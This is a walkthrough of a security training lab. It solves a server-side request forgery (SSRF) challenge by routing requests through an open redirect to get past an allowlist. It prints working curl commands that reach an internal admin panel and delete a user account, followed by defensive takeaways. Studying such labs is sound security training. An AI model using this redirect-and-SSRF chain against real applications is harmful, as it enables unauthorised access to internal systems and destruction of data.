# Walkthrough: SSRF with Filter Bypass via Open Redirection

> Replace `<LAB-ID>` and `<SESSION>` with your own lab instance values throughout.

## 1. Capture the real request and confirm the allowlist behavior

1. DevTools → Network tab → filter Fetch/XHR → click "Check stock" → inspect the `/product/stock` request.
2. Note the `stockApi` value — in this lab it's typically a **relative local path**, not a full URL:
   ```
   stockApi=/product/stock/check?productId=1&storeId=1
   ```
3. Confirm the filter rejects an external host outright:
   ```
   stockApi=http://192.168.0.12:8080/admin   → rejected
   ```
   This confirms the filter allows only local, same-application paths.

> **Encoding pitfall:** DevTools' Payload tab displays `stockApi`'s value **decoded** for readability. If you copy that decoded text directly into `curl --data-raw`, the literal `?` and `&` characters inside it get misread as form-body separators, breaking the single intended value into multiple (incomplete) parameters. Use `curl --data-urlencode 'stockApi=<value>'` instead — it encodes the value correctly as one field. This was the main source of "Missing parameter" / "Invalid URL" errors throughout this lab.

> **Shell quoting pitfall:** any URL containing `&` must be wrapped in quotes in bash/zsh, or the shell treats `&` as "run this in the background," silently truncating the command. Always quote URLs with query strings.

## 2. Find a candidate open redirect

Browse the site with DevTools Network tab open (filter: **All**, not just Fetch/XHR — a redirect is a full navigation, not an XHR call). Look for:
- Any link or action producing a `3xx` response
- Query parameters shaped like `?path=`, `?url=`, `?redirect=`, `?next=`, `?returnUrl=`

In this lab, a "next product" navigation link is the culprit:
```
/product/nextProduct?currentProductId=1&path=/product?productId=2
```

## 3. Confirm it's genuinely open

Test with an external destination:
```bash
curl -i 'https://<LAB-ID>.web-security-academy.net/product/nextProduct?currentProductId=1&path=https://example.com'
```
Check the response:
```
HTTP/2 302
location: https://example.com
```
If `Location` echoes back an arbitrary external domain rather than restricting `path` to internal pages, the redirect is confirmed open.

## 4. Chain the redirect into the SSRF

Set `stockApi` to the redirect endpoint (a valid local path, so the allowlist approves it), with its own `path` parameter pointing at the real target:

```bash
curl -i https://<LAB-ID>.web-security-academy.net/product/stock \
  -b 'session=<SESSION>' \
  --data-urlencode 'stockApi=/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin'
```

The filter sees and approves `stockApi` as a local path. The backend then requests that path, receives the `302`, and — since it follows redirects automatically — ends up fetching `192.168.0.12:8080/admin` without the filter ever inspecting that final destination.

## 5. Extract the delete-user link and trigger it

```bash
curl -s https://<LAB-ID>.web-security-academy.net/product/stock \
  -b 'session=<SESSION>' \
  --data-urlencode 'stockApi=/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin' \
  | grep -o 'href="[^"]*carlos[^"]*"'
```

Then chain the delete path through the same redirect:
```bash
curl -s https://<LAB-ID>.web-security-academy.net/product/stock \
  -b 'session=<SESSION>' \
  --data-urlencode 'stockApi=/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos'
```

## 6. Verify

Refresh the lab page — status should flip to **"Solved."**

---

## Key takeaways

- **An allowlist is only as strong as what it validates.** Checking that a submitted URL is local/approved means nothing if the application later follows a redirect to somewhere else without re-checking.
- **Two low-to-moderate severity bugs can combine into something much more serious.** Neither the SSRF filter nor the open redirect alone fully breaks the app here — together, they do. Always consider how an "unrelated" finding might unlock something else.
- **Tool/environment mechanics can masquerade as application bugs.** Several apparent failures in this lab (shell `&` truncation, DevTools' decoded Payload view, double-encoding) were debugging/tooling issues, not filter logic — always rule those out with controlled tests before concluding the app itself is behaving unexpectedly.

## Related labs

| Lab | What's different |
|---|---|
| SSRF with whitelist-based input filter | The same allowlist concept without a redirect to exploit — requires a different bypass (e.g. the `@` URL trick) |
| Blind SSRF with out-of-band detection | No response body at all — requires Burp Collaborator for confirmation |
| Blind SSRF with Shellshock exploitation | Combines blind SSRF with a Shellshock (CVE-2014-6271) payload for remote command execution and data exfiltration over an OOB channel |
